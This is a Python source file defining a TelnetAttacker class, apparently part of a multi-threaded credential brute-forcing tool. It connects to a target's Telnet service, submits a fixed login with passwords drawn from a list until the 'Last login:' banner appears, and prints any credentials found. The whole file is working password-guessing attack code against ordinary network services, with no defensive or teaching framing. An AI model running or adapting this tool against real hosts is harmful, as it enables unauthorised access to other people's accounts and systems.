import telnetlib
from target import Target, Attacker


class TelnetAttacker(Attacker):
    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self, tn, password):
        try:
            tn.read_until(b"login: ")
            tn.write(self.target.login.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")
            result = tn.expect([b"Last login:"], 2)
        except (EOFError, OSError):
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
            return False
        else:
            self.tries += 1
            self.failed_conns = 0
            if result[0] == -1:
                print("[%s] Failed attempt against %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))
            else:
                TelnetAttacker.finish = True
                TelnetAttacker.password = password
                TelnetAttacker.success = True
                print("[%s] Found credentials for %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))
            return True

    def run(self):
        take_new_password = True
        while TelnetAttacker.finish is False:
            try:
                tn = telnetlib.Telnet()
                tn.open(self.target.host, self.target.port)
            except ConnectionRefusedError:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
                self.failed_conns += 1
            except Exception:
                print("[%s] Unknown exception while connecting to %s" %
                      (self.name, self.target.host))
                self.failed_conns += 1
            else:
                while TelnetAttacker.finish is False:
                    if take_new_password:
                        password = self.get_password()
                        if password is None:
                            continue

                    if self.try_connect(tn, password) is False:
                        take_new_password = False
                        break
                    else:
                        take_new_password = True

            finally:
                tn.close()
